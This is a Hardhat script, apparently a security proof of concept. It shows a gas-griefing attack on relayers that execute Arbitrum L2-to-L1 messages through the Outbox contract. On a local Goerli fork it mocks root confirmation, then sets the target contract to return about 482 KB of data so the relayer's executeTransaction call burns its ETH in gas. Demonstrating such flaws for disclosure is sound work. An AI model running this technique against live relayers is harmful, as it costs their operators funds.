const { assert } = require("chai");
const { ethers } = require("hardhat");
const { toRpcQuantity } = require("@nomicfoundation/hardhat-network-helpers/dist/src/utils");

const arbsysAbi = require("../../abis/arbsys.json");
const nodeinterfaceAbi = require("../../abis/nodeinterface.json");
const outboxAbi = require("../../abis/outbox.json");
const { OUTBOX_ADDRESS, ARBSYS_ADDRESS, NODEINTERFACE_ADDRESS } = require("../addresses");

// Hash of the transaction that submitted the L2-to-L1 message to the `ArbSys` contract on Arbitrum Goerli.
const L2L1_MESSAGE_SUBMISSION_TX_HASH = "";
const L1_TARGET_ADDRESS = "";

// Private key of an unlocked account in Hardhat's node
const RELAYER_KEY = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const RELAYER_INITIAL_BALANCE = ethers.utils.parseEther('0.4');

/**
 * Script to relay an L2-to-L1 message from Arbitrum Goerli to a local fork of Ethereum Goerli
 */
async function main() {
    assert(L2L1_MESSAGE_SUBMISSION_TX_HASH != "", "Must set transaction's hash of L2-to-L1 message submission");
    assert(L1_TARGET_ADDRESS != "", "Must set L1 target address");

    const arbitrumProvider = ethers.getDefaultProvider(process.env.ARBITRUM_GOERLI);
    const ethereumProvider = ethers.getDefaultProvider("http://localhost:8545");

    const arbNetwork = await arbitrumProvider.getNetwork();
    assert(arbNetwork.chainId == 421613);
    assert(arbNetwork.name == "arbitrum-goerli");

    const ethNetwork = await ethereumProvider.getNetwork();
    assert(ethNetwork.chainId == 31337, "Ethereum network must be a local fork of Goerli");

    const arbsys = new ethers.Contract(ARBSYS_ADDRESS, arbsysAbi, arbitrumProvider);
    const { size } = await arbsys.callStatic.sendMerkleTreeState({
        // Must call from address(0).
        // See https://github.com/OffchainLabs/nitro/blob/99ecb32f40eba6817bdf8242f3ed9cf4155747c1/precompiles/ArbSys.go#L184
        from: ethers.constants.AddressZero
    });
    
    // Parse the `L2ToL1Tx` event emitted when the message was submitted on L2
    const transactionReceipt = await arbitrumProvider.getTransactionReceipt(L2L1_MESSAGE_SUBMISSION_TX_HASH);
    const eventData = transactionReceipt.logs[4].data;
    const eventTopics = transactionReceipt.logs[4].topics;
    const {
        caller, 
        destination,
        // hash,
        position,
        arbBlockNum,
        ethBlockNum,
        timestamp,
        callvalue,
        data
    } = arbsys.interface.decodeEventLog("L2ToL1Tx", eventData, eventTopics);

    // Build the proof for the `Outbox` contract
    const nodeinterface = new ethers.Contract(NODEINTERFACE_ADDRESS, nodeinterfaceAbi, arbitrumProvider);
    const { /*send,*/ root, proof } = await nodeinterface.constructOutboxProof(
        size,
        position // leaf
    );

    const outbox = new ethers.Contract(OUTBOX_ADDRESS, outboxAbi, ethereumProvider);
    if (await outbox.roots(root) == ethers.utils.hexZeroPad(0, 32)) {
        // If the root hasn't been confirmed yet on L1, mock it
        await setRootConfirmed(root, ethereumProvider);
        console.log("Mocked root confirmation");
    }

    // Summon the relayer and set its initial balance
    const relayer = new ethers.Wallet(RELAYER_KEY, ethereumProvider);
    await ethereumProvider.send("hardhat_setBalance", [relayer.address, toRpcQuantity(RELAYER_INITIAL_BALANCE)]);
    console.log(
        `Relayer starts with ${ethers.utils.formatEther(await ethereumProvider.getBalance(relayer.address))} ETH`
    );

    await ethereumProvider.send("hardhat_setNextBlockBaseFeePerGas", [
        "0xba43b7400", // 50 gwei
      ]);

    // Now the owner of the L1 target can change the behavior depending on things like
    // how much ETH the relayer has, or the network's gas fee.
    // In practice, the following is likely to happen in a transaction front-running the relayer's transaction
    const dataSize = 482100;
    await setTargetDataSize(dataSize, ethereumProvider);
    console.log(`Set target's returndata size to ${dataSize}`)

    // Relayer calls `Outbox::executeTransaction` (without safety measures)
    // This is essentially how Arbitrum's official SDK works by default.
    // See https://github.com/OffchainLabs/arbitrum-sdk/blob/3b6f1d3c1401e593ffb54b96998c672bfd69f89b/src/lib/message/L2ToL1MessageNitro.ts#L434
    const tx = await outbox.connect(relayer).executeTransaction(
        proof,
        position,
        caller,
        destination,
        arbBlockNum,
        ethBlockNum,
        timestamp,
        callvalue,
        data,
        { maxFeePerGas: ethers.utils.parseUnits("55", "gwei") }
    );

    try {
        receipt = await tx.wait();
        console.log(`Transaction submitting message succeeded using ${receipt.gasUsed.toString()} gas units`);
        console.log(`Relayer spent ${ethers.utils.formatEther(receipt.gasUsed.mul(receipt.effectiveGasPrice))} ETH in gas`);
      } catch (error) {
        console.log(`Transaction failed using ${error.receipt.gasUsed.toString()} gas units`);
      }

    console.log(
        `Relayer now has ${ethers.utils.formatEther(await ethereumProvider.getBalance(relayer.address))} ETH`
    );
}

/**
 * Utility function to manually set a root as confirmed in the Outbox contract.
 * Used for testing against a local fork on Hardhat Node.
 */
 async function setRootConfirmed(root, provider) {
    const slot = 3; // slot where `roots` mapping is defined in `Outbox` contract
    return provider.send("hardhat_setStorageAt", [
        OUTBOX_ADDRESS,
        // storage slot of mapping entry for roots[root]
        ethers.utils.keccak256(
            ethers.utils.concat([root, ethers.utils.hexZeroPad(slot, 32)])
        ),
        // whatever non-zero value should be enough to bypass https://github.com/OffchainLabs/nitro/blob/99ecb32f40eba6817bdf8242f3ed9cf4155747c1/contracts/src/bridge/Outbox.sol#L229
        ethers.utils.hexZeroPad(1, 32)
    ]);
}

async function setTargetDataSize(size, provider) {
    return provider.send("hardhat_setStorageAt", [
        L1_TARGET_ADDRESS,
        "0x0",
        ethers.utils.hexZeroPad(size, 32)
    ]);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
